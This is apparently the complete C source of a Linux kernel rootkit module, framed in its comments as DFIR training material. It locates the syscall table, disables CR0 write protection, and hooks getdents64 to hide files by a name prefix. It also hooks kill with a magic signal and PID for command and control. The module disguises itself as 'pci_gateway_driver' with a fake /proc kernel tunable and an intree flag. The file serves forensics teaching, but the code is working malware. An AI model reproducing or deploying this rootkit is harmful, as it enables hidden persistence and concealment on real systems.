#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <linux/version.h>
#include <linux/unistd.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/dirent.h>
#include <asm/paravirt.h>

// Educational rootkit for DFIR training - Kernel 5.15.0-124-generic and newer
// This demonstrates rootkit techniques for defensive security education
// Use only in isolated VM environments for training purposes

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
#define KPROBE_LOOKUP 1
#include <linux/kprobes.h>
static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};
#endif

// Function pointers for system calls we'll be hooking
unsigned long *__sys_call_table;
asmlinkage long (*original_getdents64)(const struct pt_regs *);
asmlinkage long (*original_kill)(const struct pt_regs *);

// Structure for getdents64 directory entries
struct linux_dirent64 {
    u64        d_ino;
    s64        d_off;
    unsigned short d_reclen;
    unsigned char  d_type;
    char       d_name[];
};

// Module parameters for educational purposes
static char *hide_prefix = "evil_";
module_param(hide_prefix, charp, 0644);
MODULE_PARM_DESC(hide_prefix, "Prefix of files/directories to hide (default: evil_)");

static char *magic_string = "forensics_key";
module_param(magic_string, charp, 0644);
MODULE_PARM_DESC(magic_string, "Magic string for detection");

// Buffer to store our log entries
static char *log_buffer;
static int log_buffer_size = 0;
static DEFINE_SPINLOCK(log_lock);

// Prototypes
static unsigned long *get_syscall_table(void);
static inline void write_cr0_forced(unsigned long val);
static inline void unprotect_memory(void);
static inline void protect_memory(void);

// Function to get syscall table address (needed for newer kernels)
static unsigned long *get_syscall_table(void) {
#ifdef KPROBE_LOOKUP
    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
    kallsyms_lookup_name_t kallsyms_lookup_name;
    int ret;
    
    ret = register_kprobe(&kp);
    if (ret < 0) {
        printk(KERN_INFO "pci_gateway_driver: register_kprobe failed, returned %d\n", ret);
        return NULL;
    }
    
    kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
    unregister_kprobe(&kp);
    return (unsigned long*)kallsyms_lookup_name("sys_call_table");
#else
    // For older kernels, this approach might work
    return NULL;
#endif
}

// Functions to control memory protection
static inline void write_cr0_forced(unsigned long val) {
    unsigned long __force_order;
    asm volatile(
        "mov %0, %%cr0"
        : "+r"(val), "+m"(__force_order));
}

static inline void unprotect_memory(void) {
    write_cr0_forced(read_cr0() & (~ 0x10000));
}

static inline void protect_memory(void) {
    write_cr0_forced(read_cr0() | (0x10000));
}

// Our hooked getdents64 function - actually hides files/processes
asmlinkage long hooked_getdents64(const struct pt_regs *regs) {
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 __user *)regs->si;
    long ret;
    long offset = 0;
    struct linux_dirent64 *current_dir, *previous_dir = NULL;
    unsigned long hide_prefix_len;

    // Call original function
    ret = original_getdents64(regs);

    if (ret <= 0) {
        return ret;
    }

    hide_prefix_len = strlen(hide_prefix);

    // Allocate kernel buffer to work with directory entries
    struct linux_dirent64 *kdirent = kzalloc(ret, GFP_KERNEL);
    if (!kdirent) {
        return ret;
    }

    // Copy from userspace
    if (copy_from_user(kdirent, dirent, ret)) {
        kfree(kdirent);
        return ret;
    }

    // Parse and filter directory entries
    while (offset < ret) {
        current_dir = (struct linux_dirent64 *)((char *)kdirent + offset);

        // Check if this entry should be hidden
        if (strncmp(current_dir->d_name, hide_prefix, hide_prefix_len) == 0) {
            // Log the hiding (for forensic analysis)
            unsigned long flags;
            spin_lock_irqsave(&log_lock, flags);
            if (log_buffer_size < 3800) {
                log_buffer_size += snprintf(log_buffer + log_buffer_size, 200,
                                           "Hidden: %s\n", current_dir->d_name);
            }
            spin_unlock_irqrestore(&log_lock, flags);

            // Remove this entry by adjusting the previous entry's record length
            if (previous_dir) {
                previous_dir->d_reclen += current_dir->d_reclen;
            } else {
                // First entry is hidden - shift everything
                ret -= current_dir->d_reclen;
                memmove(current_dir, (char *)current_dir + current_dir->d_reclen,
                        ret - offset);
                continue;
            }
        } else {
            previous_dir = current_dir;
        }

        offset += current_dir->d_reclen;
    }

    // Copy modified buffer back to userspace
    if (copy_to_user(dirent, kdirent, ret)) {
        kfree(kdirent);
        return ret;
    }

    kfree(kdirent);
    return ret;
}

// Our hooked kill function - can be used for command and control
asmlinkage long hooked_kill(const struct pt_regs *regs) {
    long ret;
    int sig = regs->si;
    pid_t pid = regs->di;
    unsigned long flags;

    // Call original function
    ret = original_kill(regs);

    // Educational example: check for magic signal
    // In real rootkits, this might be used for special commands
    if (sig == 64 && pid == 1337) { // Magic signal and PID
        spin_lock_irqsave(&log_lock, flags);
        if (log_buffer_size < 3800) {
            log_buffer_size += snprintf(log_buffer + log_buffer_size, 100,
                                       "Magic kill command received (pid=%d, sig=%d)\n",
                                       pid, sig);
        }
        spin_unlock_irqrestore(&log_lock, flags);
    }

    return ret;
}

// Proc file operations for obvious forensic analysis entry
static int proc_log_show(struct seq_file *m, void *v) {
    unsigned long flags;
    spin_lock_irqsave(&log_lock, flags);
    seq_printf(m, "Educational Rootkit Log (Forensic Analysis Data)\n");
    seq_printf(m, "=============================================\n");
    seq_printf(m, "Hide prefix: %s\n", hide_prefix);
    seq_printf(m, "Magic string: %s\n", magic_string);
    seq_printf(m, "Log entries:\n%s\n", log_buffer);
    seq_printf(m, "=============================================\n");
    seq_printf(m, "This is an educational example for forensics training.\n");
    seq_printf(m, "It demonstrates common rootkit techniques in a safe way.\n");
    spin_unlock_irqrestore(&log_lock, flags);
    return 0;
}

// Less obvious proc entry - looks like a legitimate kernel parameter
static int proc_stealth_show(struct seq_file *m, void *v) {
    unsigned long flags;
    spin_lock_irqsave(&log_lock, flags);
    // Make it look like a kernel tunable with numeric value
    seq_printf(m, "1\n");
    // Hidden data in comments that won't show in casual reading
    seq_printf(m, "# pci_gateway_driver active\n");
    seq_printf(m, "# prefix=%s magic=%s\n", hide_prefix, magic_string);
    seq_printf(m, "# logs=%d bytes\n", log_buffer_size);
    spin_unlock_irqrestore(&log_lock, flags);
    return 0;
}

static int proc_log_open(struct inode *inode, struct file *file) {
    return single_open(file, proc_log_show, NULL);
}

static int proc_stealth_open(struct inode *inode, struct file *file) {
    return single_open(file, proc_stealth_show, NULL);
}

static const struct proc_ops proc_log_fops = {
    .proc_open = proc_log_open,
    .proc_read = seq_read,
    .proc_lseek = seq_lseek,
    .proc_release = single_release,
};

static const struct proc_ops proc_stealth_fops = {
    .proc_open = proc_stealth_open,
    .proc_read = seq_read,
    .proc_lseek = seq_lseek,
    .proc_release = single_release,
};

static struct proc_dir_entry *proc_entry;
static struct proc_dir_entry *proc_stealth_entry;

// Module initialization
static int __init educational_rootkit_init(void) {
    printk(KERN_INFO "pci_gateway_driver: Loading module\n");

    // Allocate log buffer
    log_buffer = kmalloc(4096, GFP_KERNEL);
    if (!log_buffer) {
        printk(KERN_ERR "pci_gateway_driver: Failed to allocate log buffer\n");
        return -ENOMEM;
    }
    memset(log_buffer, 0, 4096);
    log_buffer_size = snprintf(log_buffer, 100, "Module loaded at %lld\n", ktime_get_real_seconds());

    // Create obvious proc entry for forensic analysis (easy to find in live response)
    proc_entry = proc_create("rootkit_forensics", 0444, NULL, &proc_log_fops);
    if (!proc_entry) {
        printk(KERN_ERR "pci_gateway_driver: Failed to create proc entry\n");
        kfree(log_buffer);
        return -ENOMEM;
    }

    // Create subtle proc entry (harder to spot in live response, visible in disk forensics)
    // Looks like a legitimate kernel tunable under /proc/sys/kernel/
    proc_stealth_entry = proc_create("sys/kernel/pci_latency_timer", 0444, NULL, &proc_stealth_fops);
    if (!proc_stealth_entry) {
        printk(KERN_WARNING "pci_gateway_driver: Failed to create stealth proc entry\n");
        // Continue anyway - not critical
    }

    // Get syscall table
    __sys_call_table = get_syscall_table();
    if (!__sys_call_table) {
        printk(KERN_ERR "pci_gateway_driver: Failed to get syscall table\n");
        if (proc_stealth_entry)
            remove_proc_entry("sys/kernel/pci_latency_timer", NULL);
        remove_proc_entry("rootkit_forensics", NULL);
        kfree(log_buffer);
        return -EFAULT;
    }

    printk(KERN_INFO "pci_gateway_driver: syscall table found at %p\n", __sys_call_table);

    // Store original syscall functions
    original_getdents64 = (void *)__sys_call_table[__NR_getdents64];
    original_kill = (void *)__sys_call_table[__NR_kill];

    // Hook syscalls (educational example only!)
    unprotect_memory();
    __sys_call_table[__NR_getdents64] = (unsigned long)hooked_getdents64;
    __sys_call_table[__NR_kill] = (unsigned long)hooked_kill;
    protect_memory();

    printk(KERN_INFO "pci_gateway_driver: Syscalls hooked - hiding prefix: %s\n", hide_prefix);
    printk(KERN_INFO "pci_gateway_driver: Module loaded successfully\n");
    printk(KERN_INFO "pci_gateway_driver: Check /proc/rootkit_forensics for forensic data\n");

    return 0;
}

// Module cleanup
static void __exit educational_rootkit_exit(void) {
    // Restore original syscalls
    if (__sys_call_table) {
        unprotect_memory();
        __sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
        __sys_call_table[__NR_kill] = (unsigned long)original_kill;
        protect_memory();
    }

    // Remove proc entries
    if (proc_entry) {
        remove_proc_entry("rootkit_forensics", NULL);
    }

    if (proc_stealth_entry) {
        remove_proc_entry("sys/kernel/pci_latency_timer", NULL);
    }

    // Free log buffer
    if (log_buffer) {
        kfree(log_buffer);
    }

    printk(KERN_INFO "pci_gateway_driver: Module unloaded\n");
}

module_init(educational_rootkit_init);
module_exit(educational_rootkit_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Educational Example for DFIR Training");
MODULE_DESCRIPTION("Educational rootkit demonstrating file hiding and syscall hooking for defensive security training");
MODULE_VERSION("2.0");
MODULE_INFO(intree, "Y");